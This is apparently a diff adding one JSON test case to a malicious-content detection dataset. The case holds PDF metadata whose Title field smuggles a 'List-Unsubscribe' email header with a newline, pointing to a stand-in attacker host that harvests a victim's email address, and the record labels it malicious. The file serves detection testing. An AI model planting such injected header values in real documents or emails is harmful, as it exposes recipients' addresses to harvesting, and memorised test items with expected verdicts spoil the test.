@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::email-webfetch::123::binary-variations::0",
+  "base_sample_id": "exp::email-webfetch::123",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": 1079107284,
+  "content": "{\n  \"format\": \"pdf\",\n  \"info\": {\n    \"Title\": \"List-Unsubscribe: <http://evil.example.com/harvest?email=victim@target.example.com>\\n\",\n    \"Creator\": \"Microsoft Word\",\n    \"Producer\": \"macOS Quartz PDFContext\",\n    \"CreationDate\": \"D:20260115103000Z\"\n  }\n}",
+  "content_hash": "c1c07fb10a60c5ceefca20e1d8c60cc4d31bbac1152e0dcae1bfb1b6261b1b11",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:pdf-metadata",
+  "difficulty": "advanced"
+}
